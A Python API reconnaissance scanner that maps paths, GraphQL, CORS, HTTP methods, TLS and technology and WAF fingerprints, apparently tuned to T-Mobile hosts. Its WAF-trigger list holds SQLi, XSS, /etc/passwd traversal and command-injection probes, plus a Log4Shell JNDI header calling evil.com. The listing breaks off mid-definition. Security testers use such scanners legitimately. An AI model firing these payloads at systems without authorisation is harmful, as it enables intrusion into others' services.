#!/usr/bin/env python3

import re
import requests
import argparse
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import socket
import json
import sys
import time
import io
import urllib3
from contextlib import redirect_stdout
from urllib.parse import urlparse

urllib3.disable_warnings()

def _scan_single_path_worker(base, path, timeout, user_agent):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": user_agent})
    url = f"{base}/{path}" if path else base
    try:
        r = s.get(url, timeout=timeout, allow_redirects=False)
        return {
            "path": path,
            "code": r.status_code,
            "size": len(r.content),
            "headers": dict(r.headers),
            "body": r.text[:500],
            "location": r.headers.get("Location", ""),
        }
    except Exception:
        return None


def _probe_graphql_path_worker(base, path, timeout, user_agent):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": user_agent})
    try:
        r = s.post(
            base + path,
            json={"query": "{ __typename }"},
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        body = r.text[:1000].lower()
        if r.status_code == 200 and ("__typename" in body or "data" in body or "errors" in body):
            return {"path": path, "method": "POST"}
    except Exception:
        pass

    try:
        r = s.get(
            base + path,
            params={"query": "{ __typename }"},
            timeout=timeout,
        )
        body = r.text[:1000].lower()
        if r.status_code == 200 and ("__typename" in body or "data" in body or "errors" in body):
            return {"path": path, "method": "GET"}
    except Exception:
        pass

    return None

PATHS = [
    "", "swagger", "api-docs", "openapi.json", "graphql", "health", "status",
    "v1", "v2", "v3", "actuator", "actuator/health", "actuator/info",
    "actuator/env", "actuator/metrics", "actuator/beans", "actuator/mappings",
    "actuator/configprops", "actuator/trace", "actuator/httptrace",
    "actuator/loggers", "actuator/heapdump", "actuator/threaddump",
    "info", "env", "metrics", "trace", "docs", "api", "swagger-ui",
    "swagger-ui.html", "swagger-ui/index.html", "api-docs/swagger.json",
    "swagger/v1/swagger.json", "swagger/v2/swagger.json",
    ".well-known/openapi.yaml", "graphiql", "playground", "console",
    "admin", "debug", "config", "version", "ping", "ready", "alive",
    "robots.txt", "sitemap.xml",
    "geo", "geo/v1", "geo/v2", "geolocate", "geolocation",
    "location", "location/v1", "locate",
    "device", "devices", "device/status", "device/location",
    "user", "users", "auth", "login", "token", "oauth", "oauth2",
    "register", "messages", "msg", "sms", "push",
    "notification", "notifications", "service", "services",
    "map", "maps", "coordinates", "address", "lookup",
    "reverse", "geocode", "search", "query", "find",
    "region", "coverage", "network", "cell", "tower",
    "api/v1", "api/v2", "api/v1/geo", "api/v1/location",
    "api/v1/device", "api/v1/status", "api/v2/geo", "api/v2/location",
    "geo-ext", "geo-ext/v1", "ext", "ext/v1",
    "v1/geo", "v1/location", "v1/geolocate", "v1/device",
    "v2/geo", "v2/location", "v2/geolocate", "v2/device",
    "apigee", "proxy", "management", "apiproxy",
    "_debug", "_status", "_health", "_info",
]

WAF_SIGNATURES = {
    "Akamai": {
        "headers": ["x-akamai-transformed", "akamai-grn", "x-akamai-request-id",
                     "x-akamai-session-info", "x-akamai-ssl-client-sid"],
        "server": ["akamaighost", "akamai"],
        "cookies": ["akamai", "ak_bmsc", "bm_sv", "bm_sz", "_abck"],
        "body": ["akamai", "reference #", "access denied"],
    },
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "cf-connecting-ip"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
        "body": ["cloudflare", "attention required", "ray id"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-apigw-id", "x-amzn-trace-id",
                     "x-amz-cf-id", "x-amz-cf-pop"],
        "server": ["awselb", "amazons3", "cloudfront"],
        "cookies": ["awsalb", "awsalbcors", "awsalbtg"],
        "body": ["aws", "request blocked"],
    },
    "F5 BIG-IP": {
        "headers": ["x-cnection", "x-wa-info"],
        "server": ["big-ip", "bigip", "f5"],
        "cookies": ["bigipserver", "bigipserverpool", "ts", "f5_cspm",
                     "f5avraaaaaaaaaaaaaaaa", "mrhhits", "lastmrh_sess"],
        "body": ["the requested url was rejected", "request rejected"],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "server": ["incapsula", "imperva"],
        "cookies": ["incap_ses", "visid_incap", "nlbi_", "reese84"],
        "body": ["incapsula", "imperva", "request unsuccessful"],
    },
    "Fortinet FortiWeb": {
        "headers": ["fortiwafsid"],
        "server": ["fortiweb"],
        "cookies": ["cookiesession1", "fwaas_show_region"],
        "body": ["fortigate", "fortiweb", "by fortinet"],
    },
    "Palo Alto": {
        "headers": [],
        "server": [],
        "cookies": [],
        "body": ["has been blocked in accordance with company policy",
                 "palo alto next generation security"],
    },
    "Barracuda": {
        "headers": ["barra_counter_session"],
        "server": ["barracuda"],
        "cookies": ["barra_counter_session", "bng_"],
        "body": ["barracuda", "you have been blocked"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri", "sucuri/cloudproxy"],
        "cookies": ["sucuri_cloudproxy"],
        "body": ["sucuri website firewall", "cloudproxy", "access denied - sucuri"],
    },
    "Fastly": {
        "headers": ["x-fastly-request-id", "fastly-restarts"],
        "server": ["fastly"],
        "cookies": [],
        "body": ["fastly error"],
    },
    "Azure Front Door / WAF": {
        "headers": ["x-azure-ref", "x-fd-healthprobe", "x-ms-ref"],
        "server": ["microsoft-azure-application-gateway"],
        "cookies": ["azureappproxy"],
        "body": ["azure", "microsoft"],
    },
    "Google Cloud Armor": {
        "headers": ["x-goog-", "x-cloud-trace-context"],
        "server": ["gws", "gse", "google frontend"],
        "cookies": [],
        "body": ["google cloud armor"],
    },
    "Apigee": {
        "headers": ["x-apigee-", "x-request-id"],
        "server": ["apigee"],
        "cookies": [],
        "body": ["messaging.adaptors.http.flow", "faultstring", "apigee"],
    },
    "Reblaze": {
        "headers": ["rbzid", "x-rbz-"],
        "server": ["reblaze"],
        "cookies": ["rbzid"],
        "body": ["reblaze"],
    },
    "ModSecurity": {
        "headers": [],
        "server": ["mod_security", "modsecurity"],
        "cookies": [],
        "body": ["mod_security", "modsecurity", "not acceptable"],
    },
    "DenyAll": {
        "headers": [],
        "server": ["denyall"],
        "cookies": ["sessioncookie"],
        "body": ["conditioned by", "denyall"],
    },
}

WAF_TRIGGERS = [
    ("SQLi", "/?id=1'+OR+1=1--+-", {}),
    ("XSS", "/?q=<script>alert(1)</script>", {}),
    ("Path Traversal", "/../../etc/passwd", {}),
    ("Command Injection", "/?cmd=;cat+/etc/passwd", {}),
    ("Log4Shell", "/", {"X-Api-Version": "${jndi:ldap://evil.com/a}"}),
    ("Shellshock", "/", {"User-Agent": "() { :; }; echo vulnerable"}),
    ("XXE Probe", "/", {"Content-Type": "application/xml"}),
    ("Large Header", "/", {"X-Oversized": "A" * 8000}),
]


def banner():
    print(f"""
 █████  ██████  ██ ███████ ███    ██  ██ ██████  ██████  ██████  
██   ██ ██   ██ ██ ██      ████   ██ ███ ██   ██      ██ ██   ██ 
███████ ██████  ██ ███████ ██ ██  ██  ██ ██████   █████  ██████  
██   ██ ██      ██      ██ ██  ██ ██  ██ ██           ██ ██   ██ 
██   ██ ██      ██ ███████ ██   ████  ██ ██      ██████  ██   ██ 
                                                                 
  c0d3Ninja
""")


def build_session(user_agent):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": user_agent})
    return s


def load_targets(args):
    targets = []
    if args.url:
        targets.append(args.url.rstrip("/"))
    if args.file:
        try:
            with open(args.file) as f:
                targets.extend(line.strip().rstrip("/") for line in f if line.strip() and not line.startswith("#"))
        except FileNotFoundError:
            print(f"  ✗ File not found: {args.file}")
            sys.exit(1)
    if args.stdin:
        targets.extend(line.strip().rstrip("/") for line in sys.stdin if line.strip() and not line.startswith("#"))
    return targets


def load_wordlist(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"  ✗ Wordlist not found: {path}")
        sys.exit(1)


# ── PATH DISCOVERY ──

def path_discovery(base, session, timeout, wordlist, processes=1, user_agent="Mozilla/5.0"):
    print(f"\n  PATH DISCOVERY")
    print(f"  {'─' * 55}")

    try:
        baseline = session.get(base + "/thispathdoesnotexist12345", timeout=timeout)
        baseline_code = baseline.status_code
        baseline_size = len(baseline.content)
    except requests.exceptions.ConnectionError:
        print(f"  ✗ Connection failed — host unreachable or dropped")
        return [], 0
    except requests.exceptions.ReadTimeout:
        print(f"  ✗ Connection timed out ({timeout}s) — try --timeout 30")
        return [], 0
    except Exception as e:
        print(f"  ✗ {type(e).__name__}: {e}")
        return [], 0

    print(f"  Baseline: HTTP {baseline_code} | {baseline_size} bytes\n")

    hits = []
    common_paths = {
        "", "/", "index", "index.html", "home", "robots.txt", "favicon.ico",
        "sitemap.xml", "status", "health", "ping", "ready", "alive",
        "api", "api/v1", "api/v2", "v1", "v2", "v3", "docs",
    }
    strong_api_markers = (
        "application/json", "application/graphql", "openapi", "swagger",
        "__schema", "__typename", '"errors"', '"data"', "graphql",
    )
    weak_page_markers = (
        "<html", "<title", "<!doctype", "welcome", "landing", "homepage",
    )

    def handle_result(result):
        if not result:
            return
        path = result["path"]
        code = result["code"]
        size = result["size"]
        headers = {k.lower(): v for k, v in (result.get("headers") or {}).items()}
        body = (result.get("body") or "").lower()

        if code != baseline_code or abs(size - baseline_size) > 20:
            tag = ""
            if code in (200, 201, 204):
                clean_path = path.strip("/")
                is_common = (clean_path in common_paths) or (path in common_paths)
                ctype = headers.get("content-type", "").lower()

                has_strong_api_signal = any(m in ctype for m in strong_api_markers) or any(
                    m in body for m in strong_api_markers
                )
                has_weak_page_signal = any(m in body for m in weak_page_markers)

                # Mark as interesting only if it is not a default/common path
                # OR if the response content strongly suggests API/app behavior.
                if (not is_common and not has_weak_page_signal) or has_strong_api_signal:
                    tag = " ← INTERESTING"
            elif code in (301, 302, 307, 308):
                tag = f" → {result.get('location', '')}"
            elif code in (401, 403):
                tag = " ← AUTH REQUIRED (exists!)"
            elif code == 405:
                tag = " ← METHOD NOT ALLOWED (exists!)"

            print(f"  [{code}] /{path}  ({size}b){tag}")
            hits.append({
                "path": f"/{path}",
                "code": code,
                "size": size,
                "headers": result.get("headers", {}),
                "body": result.get("body", ""),
            })

    if processes and processes > 1:
        try:
            with ThreadPoolExecutor(max_workers=processes) as executor:
                future_to_path = {
                    executor.submit(_scan_single_path_worker, base, path, timeout, user_agent): path
                    for path in wordlist
                }
                for future in as_completed(future_to_path):
                    try:
                        handle_result(future.result())
                    except Exception:
                        pass
        except Exception as e:
            print(f"  ⚠ Concurrent fallback to single worker ({type(e).__name__})")
            for path in wordlist:
                url = f"{base}/{path}" if path else base
                try:
                    r = session.get(url, timeout=timeout, allow_redirects=False)
                    handle_result({
                        "path": path,
                        "code": r.status_code,
                        "size": len(r.content),
                        "headers": dict(r.headers),
                        "body": r.text[:500],
                        "location": r.headers.get("Location", ""),
                    })
                except Exception:
                    pass
    else:
        for path in wordlist:
            url = f"{base}/{path}" if path else base
            try:
                r = session.get(url, timeout=timeout, allow_redirects=False)
                handle_result({
                    "path": path,
                    "code": r.status_code,
                    "size": len(r.content),
                    "headers": dict(r.headers),
                    "body": r.text[:500],
                    "location": r.headers.get("Location", ""),
                })
            except Exception:
                pass

    print(f"\n  Found {len(hits)} non-baseline responses")
    return hits, baseline_code


# ── CORS CHECK ──

def cors_check(base, session, timeout):
    print(f"\n  CORS TEST")
    print(f"  {'─' * 55}")

    found = False
    findings = {"origins": [], "reflected_evil": False}
    origins = ["https://evil.com", "null", "https://t-mobile.com", base]

    for origin in origins:
        try:
            r = session.options(base + "/", headers={
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
            }, timeout=timeout)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao:
                found = True
                print(f"  Origin: {origin}")
                print(f"    ACAO: {acao}")
                if acac:
                    print(f"    ACAC: {acac}")
                findings["origins"].append({
                    "origin": origin,
                    "acao": acao,
                    "acac": acac,
                })
        except Exception:
            pass

    try:
        r = session.get(base + "/", headers={"Origin": "https://evil.com"}, timeout=timeout)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        if acao:
            found = True
            print(f"  GET with Origin evil.com → ACAO: {acao}")
            if "evil" in acao:
                print(f"  ⚠ CORS REFLECTS ARBITRARY ORIGIN!")
                findings["reflected_evil"] = True
    except Exception:
        pass

    if not found:
        print(f"  No CORS headers returned")
    return findings


# ── HTTP METHOD TEST ──

def method_test(base, session, timeout, hits):
    print(f"\n  HTTP METHOD TEST")
    print(f"  {'─' * 55}")

    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
    test_paths = ["/"] + [h["path"] for h in hits[:5]]

    for path in test_paths:
        url = f"{base}{path}"
        results = []
        for method in methods:
            try:
                r = session.request(method, url, timeout=timeout, allow_redirects=False)
                results.append(f"{method}:{r.status_code}")
            except Exception:
                results.append(f"{method}:ERR")
        print(f"  {path}")
        print(f"    {' | '.join(results)}")


# ── RESPONSE DUMP ──

def dump_responses(hits, limit=10):
    if not hits:
        return
    print(f"\n  RESPONSE BODIES")
    print(f"  {'─' * 55}")
    for h in hits[:limit]:
        print(f"\n  [{h['code']}] {h['path']}")
        body = h["body"].strip()
        if body:
            for line in body.split("\n")[:8]:
                print(f"    {line}")


# ── WAF DETECTION ──

def waf_detect(base, session, timeout, baseline_code):
    print(f"\n  WAF / FIREWALL DETECTION")
    print(f"  {'─' * 55}")

    waf_detections = {}

    def check_response(r):
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
        server = headers_lower.get("server", "")
        cookies_raw = "; ".join([f"{c.name}={c.value}" for c in r.cookies]).lower()
        set_cookie = headers_lower.get("set-cookie", "").lower()
        all_cookies = cookies_raw + " " + set_cookie
        body = r.text[:2000].lower()
        header_keys = " ".join(headers_lower.keys())

        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0
            evidence = []

            for h in sigs["headers"]:
                if h.lower() in header_keys:
                    score += 2
                    evidence.append(f"header:{h}")
            for s in sigs["server"]:
                if s.lower() in server:
                    score += 3
                    evidence.append(f"server:{s}")
            for c in sigs["cookies"]:
                if c.lower() in all_cookies:
                    score += 2
                    evidence.append(f"cookie:{c}")
            for b in sigs["body"]:
                if b.lower() in body:
                    score += 1
                    evidence.append(f"body:'{b}'")

            if score > 0:
                if waf_name not in waf_detections:
                    waf_detections[waf_name] = {"score": 0, "evidence": []}
                waf_detections[waf_name]["score"] += score
                waf_detections[waf_name]["evidence"].extend(evidence)

    try:
        r = session.get(base + "/", timeout=timeout)
        check_response(r)
    except Exception:
        pass

    for name, path, headers in WAF_TRIGGERS:
        url = f"{base}{path}"
        try:
            r = session.get(url, headers=headers if headers else {}, timeout=timeout, allow_redirects=False)
            check_response(r)

            if r.status_code in (403, 406, 429, 501, 503):
                print(f"  [{r.status_code}] {name} payload blocked")
            elif r.status_code != baseline_code:
                print(f"  [{r.status_code}] {name} → different response")
        except requests.exceptions.ConnectionError:
            print(f"  [DROP] {name} → connection dropped (WAF kill)")
        except requests.exceptions.ReadTimeout:
            print(f"  [TIMEOUT] {name} → timed out (possible tarpit)")
        except Exception as e:
            print(f"  [ERR] {name} → {type(e).__name__}")

    return waf_detections


# ── RATE LIMIT TEST ──

def rate_limit_test(base, session, count=20):
    print(f"\n  Rate Limit Test ({count} rapid requests)...")

    rate_codes = []
    for i in range(count):
        try:
            r = session.get(base + "/", timeout=5)
            rate_codes.append(r.status_code)
            if r.status_code == 429:
                print(f"  [429] Rate limited after {i+1} requests")
                retry = r.headers.get("Retry-After", "")
                if retry:
                    print(f"    Retry-After: {retry}")
                return True
        except requests.exceptions.ConnectionError:
            print(f"  [DROP] Connection dropped after {i+1} requests")
            return True
        except Exception:
            pass

    print(f"  No rate limiting ({count} requests, codes: {set(rate_codes)})")
    return False


# ── TLS / CERT ANALYSIS ──

def tls_check(hostname, port, timeout):
    print(f"\n  TLS / CERTIFICATE ANALYSIS")
    print(f"  {'─' * 55}")

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as sock:
            sock.settimeout(timeout)
            sock.connect((hostname, port))
            cert = sock.getpeercert()
            der = sock.getpeercert(binary_form=True)

            tls_ver = sock.version()
            cipher = sock.cipher()
            print(f"  TLS:        {tls_ver}")
            print(f"  Cipher:     {cipher[0]} ({cipher[2]} bits)")

            if cert:
                subject = dict(x[0] for x in cert.get("subject", []))
                issuer = dict(x[0] for x in cert.get("issuer", []))
                san = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]

                print(f"  Subject:    {subject.get('commonName', 'N/A')}")
                print(f"  Issuer:     {issuer.get('organizationName', 'N/A')} ({issuer.get('commonName', '')})")
                print(f"  Valid:      {cert.get('notBefore', '')} → {cert.get('notAfter', '')}")

                if san:
                    print(f"  SANs ({len(san)}):")
                    for name in san[:15]:
                        print(f"    • {name}")
                    if len(san) > 15:
                        print(f"    ... and {len(san) - 15} more")

                cert_org = issuer.get("organizationName", "").lower()
                cert_cn = issuer.get("commonName", "").lower()
                cert_text = f"{cert_org} {cert_cn}"

                cdn_hints = {
                    "akamai": "Akamai", "cloudflare": "Cloudflare", "fastly": "Fastly",
                    "amazon": "AWS/CloudFront", "cloudfront": "AWS/CloudFront",
                    "google": "Google Cloud", "digicert": "DigiCert (enterprise)",
                    "let's encrypt": "Let's Encrypt", "sectigo": "Sectigo",
                    "globalsign": "GlobalSign (Google Cloud)",
                }
                for keyword, hint in cdn_hints.items():
                    if keyword in cert_text:
                        print(f"  CDN Hint:   {hint} (issuer: {cert_org})")
            else:
                print(f"  Cert:       Self-signed / no parsed data")
                if der:
                    sha1 = hashlib.sha1(der).hexdigest()
                    sha256 = hashlib.sha256(der).hexdigest()
                    print(f"  SHA1:       {sha1}")
                    print(f"  SHA256:     {sha256[:40]}...")
                    print(f"  DER Size:   {len(der)} bytes")

                    der_str = der.decode("latin-1", errors="ignore").lower()
                    cert_keywords = {
                        "t-mobile": "T-Mobile", "tmobile": "T-Mobile",
                        "akamai": "Akamai", "cloudflare": "Cloudflare",
                        "google": "Google", "amazon": "Amazon/AWS",
                        "digicert": "DigiCert", "comodo": "Comodo/Sectigo",
                        "entrust": "Entrust", "symantec": "Symantec/Broadcom",
                        "globalsign": "GlobalSign", "geotrust": "GeoTrust",
                        "fortinet": "Fortinet", "apigee": "Apigee/Google",
                        "verisign": "VeriSign",
                    }
                    found = []
                    for kw, label in cert_keywords.items():
                        if kw in der_str:
                            found.append(label)
                    if found:
                        print(f"  DER Hints:  {', '.join(set(found))}")

    except Exception as e:
        print(f"  Error: {e}")


# ── TECHNOLOGY DETECTION ──

TECH_FINGERPRINTS = {
    "Web Servers": {
        "Nginx":        {"server": ["nginx"], "headers": [], "body": []},
        "Apache":       {"server": ["apache"], "headers": [], "body": []},
        "IIS":          {"server": ["microsoft-iis"], "headers": ["x-aspnet-version", "x-powered-by-plesk"], "body": []},
        "LiteSpeed":    {"server": ["litespeed"], "headers": [], "body": []},
        "Caddy":        {"server": ["caddy"], "headers": [], "body": []},
        "Gunicorn":     {"server": ["gunicorn"], "headers": [], "body": []},
        "Uvicorn":      {"server": ["uvicorn"], "headers": [], "body": []},
        "Tomcat":       {"server": ["apache-coyote", "tomcat"], "headers": [], "body": ["apache tomcat"]},
        "Jetty":        {"server": ["jetty"], "headers": [], "body": []},
        "OpenResty":    {"server": ["openresty"], "headers": [], "body": []},
        "Cowboy":       {"server": ["cowboy"], "headers": [], "body": []},
        "Kestrel":      {"server": ["kestrel"], "headers": [], "body": []},
        "Werkzeug":     {"server": ["werkzeug"], "headers": [], "body": []},
        "WildFly":      {"server": ["wildfly"], "headers": [], "body": []},
        "WebLogic":     {"server": ["weblogic"], "headers": [], "body": []},
    },
    "Frameworks / Languages": {
        "PHP":          {"server": [], "headers": ["x-powered-by:php"], "body": [".php", "php/"]},
        "ASP.NET":      {"server": [], "headers": ["x-aspnet-version", "x-powered-by:asp.net"], "body": [".aspx", ".ashx", "asp.net"]},
        "Django":       {"server": [], "headers": ["x-frame-options:deny"], "body": ["csrfmiddlewaretoken", "django"]},
        "Flask":        {"server": ["werkzeug"], "headers": [], "body": []},
        "Express.js":   {"server": [], "headers": ["x-powered-by:express"], "body": []},
        "Spring":       {"server": [], "headers": [], "body": ["whitelabel error page", "spring", "timestamp.*status.*error"]},
        "Laravel":      {"server": [], "headers": [], "body": ["laravel_session", "laravel"]},
        "Ruby on Rails":{"server": [], "headers": ["x-runtime", "x-request-id"], "body": ["rails", "ruby"]},
        "Next.js":      {"server": [], "headers": ["x-nextjs-cache", "x-nextjs-matched-path"], "body": ["_next/", "__next", "next.js"]},
        "Nuxt.js":      {"server": [], "headers": [], "body": ["_nuxt/", "__nuxt"]},
        "FastAPI":      {"server": ["uvicorn"], "headers": [], "body": ["fastapi", "openapi"]},
        "Go (net/http)":{"server": [], "headers": [], "body": ["go-http-client"]},
        "Rust (Actix)": {"server": [], "headers": [], "body": ["actix"]},
        "Java":         {"server": ["apache-coyote", "tomcat", "jetty", "weblogic", "wildfly"], "headers": ["x-powered-by:servlet", "x-powered-by:jsp"], "body": [".jsp", ".jsf", "java"]},
        "ColdFusion":   {"server": [], "headers": ["x-powered-by:coldfusion"], "body": [".cfm", "coldfusion"]},
        "Perl":         {"server": [], "headers": ["x-powered-by:perl"], "body": [".pl", ".cgi"]},
    },
    "API Gateways / Proxies": {
        "Apigee":       {"server": ["apigee"], "headers": ["x-apigee-"], "body": ["messaging.adaptors.http.flow", "faultstring"]},
        "Kong":         {"server": ["kong"], "headers": ["x-kong-"], "body": []},
        "Traefik":      {"server": ["traefik"], "headers": [], "body": []},
        "HAProxy":      {"server": ["haproxy"], "headers": [], "body": []},
        "Envoy":        {"server": ["envoy"], "headers": ["x-envoy-"], "body": []},
        "Varnish":      {"server": ["varnish"], "headers": ["x-varnish", "via:.*varnish"], "body": []},
        "Squid":        {"server": ["squid"], "headers": ["x-squid-error"], "body": []},
        "AWS API GW":   {"server": [], "headers": ["x-amzn-requestid", "x-amz-apigw-id"], "body": []},
        "Azure API Mgmt": {"server": [], "headers": ["ocp-apim-"], "body": []},
        "MuleSoft":     {"server": [], "headers": ["x-mule-"], "body": ["mule", "anypoint"]},
        "Zuul":         {"server": [], "headers": ["x-zuul-"], "body": []},
        "Istio":        {"server": [], "headers": ["x-envoy-upstream-service-time"], "body": []},
    },
    "Cloud / Hosting": {
        "AWS":          {"server": ["amazons3", "awselb"], "headers": ["x-amz-", "x-amzn-"], "body": []},
        "Google Cloud":  {"server": ["gws", "gse", "google frontend"], "headers": ["x-goog-", "x-cloud-trace-context"], "body": []},
        "Azure":        {"server": ["microsoft-azure-application-gateway"], "headers": ["x-azure-ref", "x-ms-"], "body": []},
        "Heroku":       {"server": [], "headers": ["via:.*vegur"], "body": []},
        "Vercel":       {"server": ["vercel"], "headers": ["x-vercel-"], "body": []},
        "Netlify":      {"server": ["netlify"], "headers": ["x-nf-"], "body": []},
        "Firebase":     {"server": [], "headers": ["x-firebase-"], "body": ["firebase"]},
        "DigitalOcean":  {"server": [], "headers": ["x-do-"], "body": []},
        "Render":       {"server": [], "headers": ["x-render-"], "body": []},
        "Fly.io":       {"server": ["fly/"], "headers": ["fly-request-id"], "body": []},
    },
    "CDN": {
        "Akamai":       {"server": ["akamaighost", "akamai"], "headers": ["x-akamai-"], "body": []},
        "Cloudflare":   {"server": ["cloudflare"], "headers": ["cf-ray", "cf-cache-status"], "body": []},
        "Fastly":       {"server": ["fastly"], "headers": ["x-fastly-request-id"], "body": []},
        "CloudFront":   {"server": ["cloudfront"], "headers": ["x-amz-cf-id", "x-amz-cf-pop"], "body": []},
        "KeyCDN":       {"server": ["keycdn"], "headers": ["x-edge-"], "body": []},
        "StackPath":    {"server": ["stackpath"], "headers": [], "body": []},
        "Imperva CDN":  {"server": ["incapsula"], "headers": ["x-iinfo", "x-cdn"], "body": []},
        "Edgecast":     {"server": ["ecacc", "ecd"], "headers": [], "body": []},
    },
    "CMS": {
        "WordPress":    {"server": [], "headers": [], "body": ["wp-content", "wp-includes", "wp-json", "wordpress"]},
        "Drupal":       {"server": [], "headers": ["x-drupal-"], "body": ["drupal", "sites/default/files"]},
        "Joomla":       {"server": [], "headers": [], "body": ["/media/jui/", "joomla"]},
        "Ghost":        {"server": [], "headers": ["x-ghost-"], "body": ["ghost/"]},
        "Strapi":       {"server": [], "headers": [], "body": ["strapi"]},
        "Contentful":   {"server": [], "headers": [], "body": ["contentful"]},
    },
    "Security / Auth": {
        "OAuth2":       {"server": [], "headers": [], "body": ["oauth", "access_token", "bearer", "authorization_code"]},
        "JWT":          {"server": [], "headers": ["authorization:bearer"], "body": ["eyj"]},
        "SAML":         {"server": [], "headers": [], "body": ["samlresponse", "samlrequest", "saml"]},
        "Keycloak":     {"server": [], "headers": [], "body": ["keycloak", "auth/realms"]},
        "Auth0":        {"server": [], "headers": [], "body": ["auth0", ".auth0.com"]},
        "Okta":         {"server": [], "headers": [], "body": ["okta", ".okta.com"]},
        "ForgeRock":    {"server": [], "headers": [], "body": ["forgerock", "openam"]},
        "Ping Identity":{"server": [], "headers": [], "body": ["pingfederate", "pingaccess"]},
    },
    "Databases (exposed)": {
        "Elasticsearch":{"server": [], "headers": [], "body": ["elasticsearch", "lucene_version", "cluster_name"]},
        "MongoDB":      {"server": [], "headers": [], "body": ["mongodb", "mongo"]},
        "CouchDB":      {"server": ["couchdb"], "headers": [], "body": ["couchdb", "welcome"]},
        "Redis":        {"server": [], "headers": [], "body": ["redis"]},
        "Kibana":       {"server": ["kibana"], "headers": ["kbn-"], "body": ["kibana"]},
        "Grafana":      {"server": [], "headers": [], "body": ["grafana"]},
    },
    "Message Queues": {
        "RabbitMQ":     {"server": [], "headers": [], "body": ["rabbitmq"]},
        "Kafka":        {"server": [], "headers": [], "body": ["kafka"]},
    },
}

TECH_PROBE_PATHS = [
    "/", "/robots.txt", "/favicon.ico", "/sitemap.xml",
    "/api", "/api/v1", "/health", "/status", "/version",
    "/login", "/admin",
]


def tech_detect(base, session, timeout):
    print(f"\n  TECHNOLOGY DETECTION")
    print(f"  {'─' * 55}")

    detections = {}

    def score_response(r):
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
        server = headers_lower.get("server", "")
        header_str = " ".join(f"{k}:{v}" for k, v in headers_lower.items())
        cookies_str = " ".join(f"{c.name}={c.value}" for c in r.cookies).lower()
        set_cookie = headers_lower.get("set-cookie", "").lower()
        all_cookies = cookies_str + " " + set_cookie
        body = r.text[:5000].lower()

        for category, techs in TECH_FINGERPRINTS.items():
            for tech_name, sigs in techs.items():
                evidence = []

                for s in sigs["server"]:
                    if s.lower() in server:
                        evidence.append(f"server: {s}")

                for h in sigs["headers"]:
                    if ":" in h:
                        hk, hv = h.split(":", 1)
                        if hk in headers_lower and hv in headers_lower[hk]:
                            evidence.append(f"header: {h}")
                    else:
                        if h.lower() in header_str:
                            evidence.append(f"header: {h}")

                for b in sigs["body"]:
                    if b.lower() in body:
                        evidence.append(f"body: {b}")

                for c_name in all_cookies.split():
                    if tech_name.lower().replace(" ", "").replace(".", "") in c_name:
                        evidence.append(f"cookie: {c_name[:40]}")
                        break

                if evidence:
                    key = f"{category}:{tech_name}"
                    if key not in detections:
                        detections[key] = {"category": category, "name": tech_name, "evidence": []}
                    for e in evidence:
                        if e not in detections[key]["evidence"]:
                            detections[key]["evidence"].append(e)

    for path in TECH_PROBE_PATHS:
        url = f"{base}{path}"
        try:
            r = session.get(url, timeout=timeout, allow_redirects=False)
            score_response(r)
        except Exception:
            pass

    try:
        r = session.options(base + "/", timeout=timeout)
        score_response(r)
    except Exception:
        pass

    # Header-only quick probe
    try:
        r = session.head(base + "/", timeout=timeout)
        score_response(r)
    except Exception:
        pass

    if not detections:
        print(f"  No technologies identified")
        return {}

    by_category = {}
    for key, data in detections.items():
        cat = data["category"]
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(data)

    for category, techs in by_category.items():
        print(f"\n  {category}")
        for tech in sorted(techs, key=lambda t: len(t["evidence"]), reverse=True):
            ev_count = len(tech["evidence"])
            conf = "HIGH" if ev_count >= 3 else "MEDIUM" if ev_count >= 2 else "LOW"
            icon = "⚠" if conf == "HIGH" else "✓" if conf == "MEDIUM" else "•"
            print(f"    {icon} {tech['name']}  [{conf}]")
            for e in tech["evidence"][:4]:
                print(f"        → {e}")

    return detections


# ── SECURITY HEADERS AUDIT ──

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "HIGH",
        "desc": "HSTS not set — susceptible to SSL stripping",
        "check_value": lambda v: "max-age" in v.lower() and int(
            next((p.split("=")[1] for p in v.split(";") if "max-age" in p.lower()), "0")
        ) >= 31536000,
        "bad_value_desc": "HSTS max-age too low (should be >= 31536000)",
    },
    "Content-Security-Policy": {
        "severity": "MEDIUM",
        "desc": "CSP not set — no protection against XSS/injection",
        "check_value": lambda v: "unsafe-inline" not in v and "unsafe-eval" not in v and "*" not in v.split(),
        "bad_value_desc": "CSP contains unsafe directives",
    },
    "X-Content-Type-Options": {
        "severity": "LOW",
        "desc": "Missing — browser may MIME-sniff responses",
        "check_value": lambda v: v.lower().strip() == "nosniff",
        "bad_value_desc": "Should be 'nosniff'",
    },
    "X-Frame-Options": {
        "severity": "MEDIUM",
        "desc": "Missing — vulnerable to clickjacking",
        "check_value": lambda v: v.upper().strip() in ("DENY", "SAMEORIGIN"),
        "bad_value_desc": "Invalid value (should be DENY or SAMEORIGIN)",
    },
    "Referrer-Policy": {
        "severity": "LOW",
        "desc": "Missing — referrer may leak sensitive URL data",
